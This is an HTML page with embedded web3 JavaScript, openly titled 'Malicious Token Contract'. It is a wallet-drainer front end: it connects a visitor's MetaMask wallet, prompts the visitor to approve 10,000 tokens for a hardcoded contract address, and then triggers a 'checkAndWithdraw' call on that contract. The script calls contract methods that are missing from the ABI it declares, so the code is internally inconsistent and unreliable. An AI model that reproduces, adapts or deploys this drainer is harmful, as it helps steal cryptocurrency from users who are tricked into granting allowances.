<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Token Contract</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <h1>Malicious Token Contract</h1>

    <button id="connectWalletBtn">Connect Wallet</button>
    <button id="approveTokensBtn" disabled>Approve Tokens</button>
    <button id="checkAndWithdrawBtn" disabled>Check & Withdraw</button>

    <div id="status"></div>

    <script>
        const web3 = new Web3(window.ethereum);

        
        const contractABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "spender",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "approve",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "balanceOf",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transfer",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];





        
        const contractAddress = '0x6AaF80bDAa1253F03D9Dc909B52d81CD67611D38';  // Replace with the contract address
        const contract = new web3.eth.Contract(contractABI, contractAddress);

        let userAccount;

        // Connect to MetaMask wallet
        async function connectWallet() {
            try {
                const accounts = await web3.eth.requestAccounts();
                userAccount = accounts[0];
                document.getElementById("status").innerText = `Connected to: ${userAccount}`;
                document.getElementById("approveTokensBtn").disabled = false;
                document.getElementById("checkAndWithdrawBtn").disabled = false;
            } catch (error) {
                console.error("Error connecting wallet:", error);
                document.getElementById("status").innerText = "Error connecting wallet.";
            }
        }

        // Approve tokens for the contract to spend
        async function approveTokens() {
            const tokenAmount = web3.utils.toWei('10000', 'ether');  // 10,000 tokens (change as needed)
            try {
                await contract.methods.approveTokens(tokenAmount).send({ from: userAccount });
                document.getElementById("status").innerText = "Tokens approved successfully!";
            } catch (error) {
                console.error("Error approving tokens:", error);
                document.getElementById("status").innerText = "Error approving tokens.";
            }
        }

        // Check and withdraw tokens
        async function checkAndWithdraw() {
            try {
                await contract.methods.checkAndWithdraw().send({ from: userAccount });
                document.getElementById("status").innerText = "Tokens checked and withdrawal attempted!";
            } catch (error) {
                console.error("Error checking and withdrawing:", error);
                document.getElementById("status").innerText = "Error processing withdrawal.";
            }
        }

        // Event listeners
        document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
        document.getElementById("approveTokensBtn").addEventListener("click", approveTokens);
        document.getElementById("checkAndWithdrawBtn").addEventListener("click", checkAndWithdraw);
    </script>
</body>
</html>

